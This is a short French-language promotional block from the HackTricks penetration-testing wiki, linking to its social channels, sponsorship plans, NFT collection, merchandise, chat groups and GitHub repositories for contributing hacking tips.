<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
